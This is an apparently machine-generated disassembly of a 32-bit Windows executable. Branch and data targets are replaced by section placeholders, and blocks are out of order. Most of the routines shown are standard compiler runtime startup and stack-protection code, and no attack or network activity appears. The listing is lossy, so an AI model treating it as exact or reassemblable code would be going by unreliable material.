mov [ ebp + 0x24 ] ecx
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax * 4 ]
mov esi [ ebp - 0x7e8 ]
lea eax [ edx + eax * 4 ]
mov [ eax ] 0x20
mov [ ebp - 0x810 ] eax
mov eax [ ebp - 0x804 ]
mov [ edi + esi * 8 ] eax
mov eax [ ebp - 0x7fc ]
mov [ edi + esi * 8 + 0x4 ] eax
xor eax eax
cmp [ ebx ] eax
sete al
mov [ ebx ] eax
test ecx ecx
jle r-xdata
mov [ ebp - 0x7f8 ] ecx
test ecx ecx
je r-xdata
push ebx
push edi
push edx
call sub_40b870
add esp 0xc
mov esi eax
jmp r-xdata
lea eax [ ebp - 0x7dc ]
push eax
lea eax [ ebp - 0x5e0 ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push ebx
push edi
push edx
call sub_408f20
add esp 0x18
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x270f
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
cmp ecx 0x10
je r-xdata
mov eax [ ebp - 0x7e8 ]
mov ecx [ ebp - 0x808 ]
mov [ edi + eax * 8 ] ecx
mov ecx [ ebp - 0x7ec ]
mov [ edi + eax * 8 + 0x4 ] ecx
mov ecx [ ebp - 0x810 ]
mov [ ecx ] eax
mov eax [ ebp - 0x7f8 ]
cmp eax 0x20
je r-xdata
mov esi 0x2648
jmp r-xdata
mov edx [ ebp + 0x24 ]
mov eax [ ebp - 0x7dc ]
cmp edx 0x2
jl r-xdata
mov [ edi + ecx * 8 ] 0x0
mov ecx [ ebp - 0x7f0 ]
mov [ ecx ] 0x20
mov ecx [ ebp - 0x804 ]
mov [ edi + eax * 8 ] ecx
mov ecx [ ebp - 0x7fc ]
mov [ edi + eax * 8 + 0x4 ] ecx
mov ecx [ ebp - 0x7f0 ]
mov [ ecx ] eax
jmp r-xdata
xor edi edi
mov [ ebp - 0x7d8 ] eax
mov esi 0xffffd8f0
test eax eax
jle r-xdata
xor ecx ecx
mov esi 0xffffd8f0
mov [ ebp - 0x7f4 ] ecx
test eax eax
jle r-xdata
mov ecx [ ebp - 0x4 ]
xor eax eax
cmp [ ebx ] eax
pop edi
sete al
neg esi
mov [ ebx ] eax
xor ecx ebp
mov eax esi
pop esi
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x7e0 ]
neg [ ebp + 0x20 ]
lea ebx [ ebp - 0x5e0 ]
dec eax
push eax
push 0x0
lea eax [ ebp - 0x5e0 ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
lea eax [ ebp - 0x7d4 ]
push eax
call sub_40bb80
mov edx [ ebp + 0x24 ]
add esp 0x14
mov eax 0x7
add edx 0xfffffffe
lea eax [ ebp - 0x5e0 ]
mov [ ebp - 0x80c ] edx
mov [ ebp - 0x7d8 ] eax
nop [ eax + eax ] eax
mov ebx [ ebp - 0x7e4 ]
mov edx [ ebp + 0x24 ]
inc edi
add ebx 0x8
cmp edi [ ebp - 0x7d8 ]
jl r-xdata
push edx
push 0xffffd8f0
push [ eax + 0x4 ]
push [ eax ]
push [ ebp + ecx * 4 - 0x1f8 ]
push ebx
push edi
push [ ebp - 0x800 ]
call sub_40bd60
mov ecx [ ebp - 0x7f4 ]
add esp 0x20
mov edx [ ebp - 0x80c ]
cmp eax esi
cmovg esi eax
mov [ ebp + ecx * 4 - 0x7d4 ] eax
inc ecx
mov eax [ ebp - 0x7d8 ]
add eax 0x8
mov [ ebp - 0x7f4 ] ecx
mov [ ebp - 0x7d8 ] eax
cmp ecx [ ebp - 0x7dc ]
jl r-xdata
mov eax [ ebp - 0x7dc ]
push edx
push esi
push [ ebx + 0x4 ]
push [ ebx ]
push [ ebp + edi * 4 - 0x1f8 ]
push [ ebp - 0x7e4 ]
push [ ebp - 0x7e0 ]
push [ ebp - 0x800 ]
call sub_40bd60
add esp 0x20
cmp eax esi
cmovg esi eax
cmp eax [ ebp + 0x20 ]
jge r-xdata
sub_40c060
push ebp
mov ebp esp
sub esp 0x7ec
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0x14 ]
push edi
lea edi [ ebp - 0x7d8 ]
mov [ ebp - 0x7dc ] eax
push edi
lea edi [ ebp - 0x5e0 ]
mov [ ebp - 0x7e4 ] ecx
push edi
lea edi [ ebp - 0x1f8 ]
mov [ ebp - 0x7e0 ] edx
push edi
push edx
push ecx
push eax
mov [ ebp - 0x7ec ] esi
mov [ ebp - 0x7e8 ] ebx
call sub_408f20
add esp 0x18
test eax eax
je r-xdata
mov ecx [ ebp - 0x7d8 ]
test ecx ecx
jle r-xdata
mov eax [ ebp - 0x7d8 ]
mov esi 0xffffd8f0
test eax eax
jle r-xdata
mov ecx [ ebp - 0x4 ]
xor eax eax
pop edi
mov [ esi ] 0x20
xor ecx ebp
pop esi
mov [ ebx ] 0x0
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov eax [ ebp + ecx * 4 - 0x1fc ]
mov [ esi ] eax
mov eax [ ebp + ecx * 8 - 0x5e8 ]
mov [ ebx ] eax
mov eax [ ebp + ecx * 8 - 0x5e4 ]
pop edi
mov [ ebx + 0x4 ] eax
mov eax 0x1
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
dec eax
push eax
push 0x0
lea eax [ ebp - 0x5e0 ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
lea eax [ ebp - 0x7d4 ]
push eax
call sub_40bb80
mov ecx 0xffffd8f0
lea esi [ ebp - 0x5e0 ]
add esp 0x14
mov [ ebp - 0x7d8 ] ecx
xor edi edi
lea edi [ ebp - 0x5e0 ]
xor ebx ebx
inc edi
add esi 0x8
cmp edi 0x7
jl r-xdata
mov edx [ ebp - 0x7ec ]
mov ecx eax
mov eax [ ebp + edi * 4 - 0x1f8 ]
mov [ ebp - 0x7d8 ] ecx
mov [ edx ] eax
mov eax [ esi ]
mov [ ebx ] eax
mov eax [ esi + 0x4 ]
mov [ ebx + 0x4 ] eax
push 0x4
push 0xffffd8f0
push [ edi + 0x4 ]
push [ edi ]
push [ ebp + ebx * 4 - 0x1f8 ]
push [ ebp - 0x7e0 ]
push [ ebp - 0x7e4 ]
push [ ebp - 0x7dc ]
call sub_40bd60
add esp 0x20
mov [ ebp + ebx * 4 - 0x7d4 ] eax
cmp eax esi
lea edi [ edi + 0x8 ]
cmovg esi eax
mov eax [ ebp - 0x7d8 ]
inc ebx
cmp ebx eax
jl r-xdata
mov ebx [ ebp - 0x7e8 ]
push 0x6
push ecx
push [ esi + 0x4 ]
push [ esi ]
push [ ebp + edi * 4 - 0x1f8 ]
push [ ebp - 0x7e0 ]
push [ ebp - 0x7e4 ]
push [ ebp - 0x7dc ]
call sub_40bd60
mov ecx [ ebp - 0x7d8 ]
add esp 0x20
cmp eax ecx
jle r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
sub_40c364
push ebp
mov ebp esp
jmp r-xdata
push [ ebp + 0x8 ]
call sub_42989d
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_4297a7
pop ecx
test eax eax
jne r-xdata
pop ebp
retn
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
call sub_40c7db
call sub_40c7f8
sub_40c3c0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax

cmp ecx eax
r-xdata
sub_40c3ed
push esi
push 0x2
call sub_429c46
call sub_40cf96
push eax
call sub_42af76
call sub_42c96a
mov esi eax
call sub_40cf93
push 0x1
mov [ esi ] eax
call sub_40cd0f
add esp 0xc
pop esi
test al al
je r-xdata
push 0x7
call sub_40d018
int3
fnclex
call sub_40d202
push sub_40d22d
call sub_40cedb
call sub_40cf8f
push eax
call sub_42a4d0
pop ecx
pop ecx
test eax eax
jne r-xdata
call sub_40cfa2
call sub_40d000
test eax eax
je r-xdata
call sub_40cfdb
call sub_40cfdc
call sub_40cfba
call sub_40cf9f
push eax
call sub_42b95d
pop ecx
call j_sub_42a59c#2
call sub_40d166
xor eax eax
retn
push sub_40cf8c
call sub_429d34
pop ecx
sub_40c4ac
push 0x14
push r--data
call sub_40d260
push 0x1
call sub_40ccd6
pop ecx
test al al
jne r-xdata
xor bl bl
mov [ ebp - 0x19 ] bl
and [ ebp - 0x4 ] 0x0
call sub_40cbf8
mov [ ebp - 0x24 ] al
mov eax [ rw-data ]
xor ecx ecx
inc ecx
cmp eax ecx
je r-xdata
push 0x7
call sub_40d018
test eax eax
jne r-xdata
mov bl cl
mov [ ebp - 0x19 ] bl
mov [ rw-data ] ecx
push r--data
push r--data
call sub_42aef9
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40d012
mov esi eax
cmp [ esi ] edi
je r-xdata
push esi
call sub_40cda6
pop ecx
test al al
je r-xdata
push r--data
push r--data
call sub_42ae9d
pop ecx
pop ecx
mov [ rw-data ] 0x2
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax 0xff
jmp r-xdata
push edi
call sub_40e348
pop ecx
call sub_40d133
movzx eax ax
push eax
call sub_42ae04
push eax
push edi
push __dos_header
call sub_4061d0
mov esi eax
push edi
call sub_40e3e4
pop ecx
call sub_40d169
test al al
jne r-xdata
push esi
call sub_40cda6
pop ecx
test al al
je r-xdata
push edi
push 0x2
push edi
mov esi [ esi ]
mov ecx esi
call j_sub_40d468
call esi
push [ ebp - 0x24 ]
call sub_40ce33
pop ecx
call sub_40d00c
mov esi eax
xor edi edi
cmp [ esi ] edi
je r-xdata
call sub_40d2a6
retn
test bl bl
jne r-xdata
push esi
call sub_417184
push [ esi ]
call sub_41714c
pop ecx
push edi
push 0x1
call sub_40ce47
pop ecx
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
mov eax esi
jmp r-xdata
call sub_417121
sub_40c5f3
mov esp [ ebp - 0x18 ]
call sub_40d169
test al al
jne r-xdata
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
push [ ebp - 0x20 ]
call sub_417130
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_40d2a6
retn
call sub_417112
sub_40c6e1
push ebp
mov ebp esp
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
mov [ esi ] r--data
and [ eax ] 0x0
and [ eax + 0x4 ] 0x0
push eax
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call sub_40e691
pop ecx
pop ecx
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40c75d
push ebp
mov ebp esp
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
mov [ esi ] r--data
push eax
call sub_40e6f4
test [ ebp + 0x8 ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_42d0aa
pop ecx
sub_40c787
push ebp
mov ebp esp
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
mov [ esi ] r--data
push eax
call sub_40e6f4
test [ ebp + 0x8 ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_42d0aa
pop ecx
sub_40c7b1
push ebp
mov ebp esp
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
mov [ esi ] r--data
push eax
call sub_40e6f4
test [ ebp + 0x8 ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_42d0aa
pop ecx
sub_40c84f
push ebp
mov ebp esp
sub esp 0x324
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x324 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
push 0x4
pop eax
imul eax eax 0x0
mov [ eax + rw-data ] 0x2
push 0x4
pop eax
imul eax eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push 0x4
pop eax
shl eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push r--data
call sub_40c827
mov esp ebp
pop ebp
retn
push 0x2
pop ecx
int 0x29
sub_40c956
push ebp
mov ebp esp
sub esp 0x31c
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x31c ]
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
push 0x4
pop eax
imul eax eax 0x0
mov ecx [ ebp + 0x8 ]
mov [ eax + rw-data ] ecx
push r--data
call sub_40c827
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
int 0x29
sub_40ca26
push ebp
mov ebp esp
sub esp 0x320
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x8 ]
int 0x29
cmp [ ebp + 0xc ] 0xe
jbe r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
inc eax
mov [ rw-data ] eax
push 0x4
pop eax
imul eax eax 0x0
mov ecx [ ebp + 0x8 ]
mov [ eax + rw-data ] ecx
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp + 0xc ]
dec eax
mov [ ebp + 0xc ] eax
and [ ebp + 0xc ] 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
push r--data
call sub_40c827
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x10 ]
mov ecx [ edx + ecx * 4 ]
mov [ eax * 4 + rw-data ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
sub_40cb7a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
lea edx [ ecx + 0x18 ]
add edx eax
movzx eax [ ecx + 0x6 ]
imul esi eax 0x28
add esi edx
cmp edx esi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
add edx 0x28
cmp edx esi
jne r-xdata
mov eax [ edx + 0x8 ]
add eax [ edx + 0xc ]
cmp ecx eax
jb r-xdata
cmp ecx [ edx + 0xc ]
jb r-xdata
mov eax edx
jmp r-xdata
pop esi
pop ebp
retn
sub_40cbbe
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx 0x5a4d
cmp [ eax ] cx
jne r-xdata
xor al al
pop ebp
retn
mov ecx [ eax + 0x3c ]
add ecx eax
cmp [ ecx ] 0x4550
jne r-xdata
mov eax 0x10b
cmp [ ecx + 0x18 ] ax
sete al
pop ebp
retn
sub_40cbf8
mov eax [ fs : 0x18 ]
push esi
mov esi rw-data
mov edx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov ecx edx
[ esi ] ecx
test eax eax
jne r-xdata
cmp edx eax
je r-xdata
xor al al
pop esi
retn
mov al 0x1
pop esi
retn
sub_40cc73
push ebp
mov ebp esp
call sub_40d45c
test eax eax
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
call sub_4298cc
pop ecx
pop ecx
pop ebp
retn
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
push eax
push [ ebp + 0x8 ]
call j_sub_40d468
call [ ebp + 0x14 ]
sub_40ccd6
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
call sub_40d2e2
call sub_40e781
test al al
jne r-xdata
mov [ rw-data ] 0x1
call sub_42ce41
test al al
jne r-xdata
xor al al
pop ebp
retn
mov al 0x1
pop ebp
retn
push 0x0
call sub_40e7c5
pop ecx
jmp r-xdata
sub_40cd0f
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_40d45c
test eax eax
je r-xdata
cmp esi 0x1
jne r-xdata
mov eax [ rw-data ]
lea esi [ ebp - 0xc ]
push edi
and eax 0x1f
mov edi rw-data
push 0x20
pop ecx
sub ecx eax
or eax 0xffffffff
ror eax cl
xor eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi rw-data
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
lea esi [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov al 0x1
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
test esi esi
jne r-xdata
push 0x5
call sub_40d018
int3
push rw-data
call sub_42cb9a
pop ecx
test eax eax
je r-xdata
push rw-data
call sub_42cb9a
neg eax
pop ecx
sbb al al
inc al
jmp r-xdata
xor al al
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
sub_40cda6
push 0x8
push r--data
call sub_40d260
and [ ebp - 0x4 ] 0x0
mov eax 0x5a4d
cmp [ __dos_header ] ax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor al al
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx __dos_header
sub eax ecx
push eax
push ecx
call sub_40cb7a
pop ecx
pop ecx
test eax eax
je r-xdata
test [ eax + 0x24 ] 0x80000000
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov al 0x1
jmp r-xdata
call sub_40d2a6
retn
sub_40ce47
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
push [ ebp + 0x8 ]
call sub_42ce66
push [ ebp + 0x8 ]
call sub_40e7c5
pop ecx
pop ecx
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov al 0x1
pop ebp
retn
sub_40ce6f
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx eax
xor eax [ rw-data ]
and ecx 0x1f
push [ ebp + 0x8 ]
ror eax cl
cmp eax 0xffffffff
jne r-xdata
push rw-data
call sub_42cbd7
pop ecx
call sub_42ca6f
jmp r-xdata
neg eax
pop ecx
sbb eax eax
not eax
and eax [ ebp + 0x8 ]
pop ebp
retn
sub_40ceaa
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx eax
xor eax [ rw-data ]
and ecx 0x1f
ror eax cl
cmp eax 0xffffffff
jne r-xdata
push [ ebp + 0x8 ]
push rw-data
call sub_42cbd7
pop ecx
pop ecx
pop ebp
retn
pop ebp
jmp sub_42ca52
sub_40cef0
push ebp
mov ebp esp
sub esp 0x14
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
mov eax [ rw-data ]
push esi
push edi
mov edi 0xbb40e64e
mov esi 0xffff0000
cmp eax edi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
xor eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
call [ GetCurrentThreadId@IAT ]
xor [ ebp - 0x4 ] eax
call [ GetCurrentProcessId@IAT ]
xor [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov ecx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
xor ecx [ ebp - 0x14 ]
xor ecx [ ebp - 0x4 ]
xor ecx eax
cmp ecx edi
jne r-xdata
test esi eax
je r-xdata
test esi ecx
jne r-xdata
mov ecx 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] ecx
not ecx
mov [ rw-data ] ecx
mov eax ecx
or eax 0x4711
shl eax 0x10
or ecx eax
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_40d018
push ebp
mov ebp esp
sub esp 0x324
push ebx
push esi
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
xor esi esi
lea eax [ ebp - 0x324 ]
push 0x2cc
push esi
push eax
mov [ rw-data ] esi
call sub_40de60
add esp 0xc
mov [ ebp - 0x274 ] eax
mov [ ebp - 0x278 ] ecx
mov [ ebp - 0x27c ] edx
mov [ ebp - 0x280 ] ebx
mov [ ebp - 0x284 ] esi
mov [ ebp - 0x288 ] edi
mov [ ebp - 0x25c ] ss
mov [ ebp - 0x268 ] cs
mov [ ebp - 0x28c ] ds
mov [ ebp - 0x290 ] es
mov [ ebp - 0x294 ] fs
mov [ ebp - 0x298 ] gs
pushfd
pop [ ebp - 0x264 ]
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x26c ] eax
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x260 ] eax
mov [ ebp - 0x324 ] 0x10001
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp - 0x270 ] eax
lea eax [ ebp - 0x58 ]
push esi
push eax
call sub_40de60
mov eax [ ebp + 0x4 ]
add esp 0xc
mov [ ebp - 0x58 ] 0x40000015
mov [ ebp - 0x54 ] 0x1
mov [ ebp - 0x4c ] eax
call [ IsDebuggerPresent@IAT ]
push esi
lea ebx [ eax - 0x1 ]
neg ebx
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x324 ]
sbb bl bl
mov [ ebp - 0x4 ] eax
inc bl
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
int 0x29
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bl
neg eax
sbb eax eax
and [ rw-data ] eax
sub_40d133
push ebp
mov ebp esp
sub esp 0x44
push 0x44
lea eax [ ebp - 0x44 ]
push 0x0
push eax
call sub_40de60
add esp 0xc
lea eax [ ebp - 0x44 ]
push eax
call [ GetStartupInfoW@IAT ]
test [ ebp - 0x18 ] 0x1
je r-xdata
push 0xa
pop eax
movzx eax [ ebp - 0x14 ]
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_40d169
push 0x0
call [ GetModuleHandleW@IAT ]
mov ecx eax
test ecx ecx
jne r-xdata
mov eax 0x5a4d
cmp [ ecx ] ax
jne r-xdata
xor al al
retn
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
jne r-xdata
cmp [ eax + 0x74 ] 0xe
jbe r-xdata
cmp [ eax + 0xe8 ] 0x0
setne al
retn
sub_40d1b9
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_42cf31
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
je r-xdata
sub_40d202
push ebx
push esi
mov esi r--data
mov ebx r--data
cmp esi ebx
jae r-xdata
pop esi
pop ebx
retn
push edi
add esi 0x4
cmp esi ebx
jb r-xdata
mov ecx edi
call j_sub_40d468
call edi
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
sub_40d22d
push ebx
push esi
mov esi r--data
mov ebx r--data
cmp esi ebx
jae r-xdata
pop esi
pop ebx
retn
push edi
add esi 0x4
cmp esi ebx
jb r-xdata
mov ecx edi
call j_sub_40d468
call edi
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
sub_40d260
push sub_40e4e0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax

sub_40d2c2
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_42d0aa
pop ecx
sub_40d2e2
push ebp
mov ebp esp
and [ rw-data ] 0x0
sub esp 0x1c
push ebx
xor ebx ebx
inc ebx
or [ rw-data ] ebx
push 0xa
call IsProcessorFeaturePresent
test eax eax
je r-xdata
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
xor ecx ecx
mov [ rw-data ] ebx
xor eax eax
cpuid
push esi
mov esi [ rw-data ]
push edi
lea edi [ ebp - 0x1c ]
or esi 0x2
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
xor ecx 0x49656e69
mov eax [ ebp - 0x14 ]
xor eax 0x6c65746e
mov [ rw-data ] esi
or ecx eax
mov eax [ ebp - 0x18 ]
xor eax 0x756e6547
or ecx eax
neg ecx
push 0x1
sbb cl cl
pop eax
add cl 0x1
push 0x0
pop ecx
cpuid
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x8 ] ecx
je r-xdata
mov edi [ rw-data ]
mov eax [ ebp - 0x1c ]
and eax 0xfff3ff0
cmp eax 0x106c0
je r-xdata
xor eax eax
push 0x7
xor ecx ecx
lea esi [ ebp - 0x1c ]
pop eax
cpuid
mov [ esi ] eax
mov eax esi
mov esi [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x18 ]
test eax 0x200
je r-xdata
mov edi [ rw-data ]
or edi 0x1
mov [ rw-data ] edi
jmp r-xdata
cmp eax 0x20660
je r-xdata
pop edi
pop esi
or esi 0x4
mov [ rw-data ] 0x2
mov [ rw-data ] esi
test ecx 0x8000000
je r-xdata
test ecx 0x100000
je r-xdata
or edi 0x2
mov [ rw-data ] edi
jmp r-xdata
cmp [ ebp - 0xc ] 0x7
jl r-xdata
cmp eax 0x20670
je r-xdata
test ecx 0x10000000
je r-xdata
cmp eax 0x30650
je r-xdata
or esi 0x8
mov [ rw-data ] 0x3
mov [ rw-data ] esi
test al 0x20
je r-xdata
cmp eax 0x30660
je r-xdata
or esi 0x20
mov [ rw-data ] 0x5
mov [ rw-data ] esi
cmp eax 0x30670
jne r-xdata
sub_40d46c
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
lea ecx [ ebp - 0x18 ]
and [ ebp - 0x18 ] 0x0
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_40d6a8
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
